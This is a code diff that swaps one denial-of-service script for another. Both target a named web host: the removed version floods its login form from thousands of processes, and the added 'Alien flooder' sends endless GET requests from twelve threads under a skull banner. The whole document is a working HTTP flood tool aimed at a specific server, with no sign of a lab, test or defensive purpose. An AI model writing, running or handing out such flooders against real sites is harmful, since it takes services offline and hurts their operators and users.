@@ -1,41 +1,79 @@
+import optparse
+import time
 import requests
-import random
-import string
-from multiprocessing import Process
-from time import sleep
+import threading  # modules importationimport requests
 
-url = 'http://apache1.willilazarov.cz/'
-Pros = []
-
-#generate random string
-def get_random_string(length):
-    letters = string.ascii_lowercase
-    return ''.join(random.choice(letters) for i in range(length))
-
-#loop in which program tries to login to overload the website
-def attack(i):
-    for x in range(10000):
-         #random string is inserted to login fields
-        randomName = get_random_string(8)
-        payload = {'username': 'randomName',
-               'password': 'randomName',
-               'login': 'login'
-               }
-        # instance to make a post request to the login url with  login details as a payload
-        r = requests.Session()
-        r.post(url, data=payload)
-        print(x, 'toto je i: ', i)
+def stresser():  # stresser function
+    _host = 'http://apache1.willilazarov.cz'
+    while (1 < 4):  # infinite loop
+        try:
+            r = requests.get(_host)  # sending requests
+            print(" [*] flooding {} in port 80  ".format(_host))
+        except (requests.ConnectionError, requests.HTTPError):  # if host don't exist
+            print("[-] host don't exist  ")
+            sys.exit()  # exit
 
 
-if __name__ == "__main__":
-    for i in range(0, 10000):
-        print("Thread Started")
-        p = Process(target=attack, args=(i,))
-        Pros.append(p)
-        p.start()
+def _threads_():  # threading function
 
-    # block until all the threads finish (i.e. block until all function_x calls finish)
-    for t in Pros:
-        t.join()
+    c = threading.Thread(target=stresser)  # creating threads
+    d = threading.Thread(target=stresser)
+    a = threading.Thread(target=stresser)
+    e = threading.Thread(target=stresser)
+    z = threading.Thread(target=stresser)
+    x = threading.Thread(target=stresser)
+    c1 = threading.Thread(target=stresser)
+    d1 = threading.Thread(target=stresser)
+    a1 = threading.Thread(target=stresser)
+    e1 = threading.Thread(target=stresser)
+    z1 = threading.Thread(target=stresser)
+    x1 = threading.Thread(target=stresser)
 
-    print('finished')
+    c.start()  # starting threads
+    d.start()
+    a.start()
+    e.start()
+    z.start()
+    x.start()
+    c1.start()
+    d1.start()
+    a1.start()
+    e1.start()
+    z1.start()
+    x1.start()
+
+
+
+def main():  # main function ( most important )
+
+    print("""
+********************************
+*        _______                 * 
+*     .adOOOOOOOOOba.            *
+*    dOOOOOOOOOOOOOOOb           *
+*   dOOOOOOOOOOOOOOOOOb          *
+*  dOOOOOOOOOOOOOOOOOOOb         *
+* |OOOOOOOOOOOOOOOOOOOOO|        *
+* OP'~"YOOOOOOOOOOOP"~`YO        *
+* OO     `YOOOOOP'     OO        *
+* OOb      `OOO'      dOO        *
+* YOOo      OOO      oOOP        *
+*` OOOo     OOO     oOOO'        *
+* ` OOOb._,dOOOb._,dOOO'         *
+*  ` OOOOOOOOOOOOOOOOO'          *
+*    OOOOOOOOOOOOOOOOO           *
+*    YOOOOOOOOOOOOOOOP           *
+*   ` OOOOOOOOOOOOOOO'           *
+*    ` OOOOOOOOOOOOO'            *
+*      `OOOOOOOOOOO'             *
+*        `~OOOOO~'               *
+**********************************
+* Alien flooder (HTTP flooder)   *
+**********************************      
+""")  # ascii code (index)
+    print("[*] start flooding ")  # info
+    time.sleep(3)  # sleeping
+    _threads_()  # threading function start
+
+
+main()  # main function start
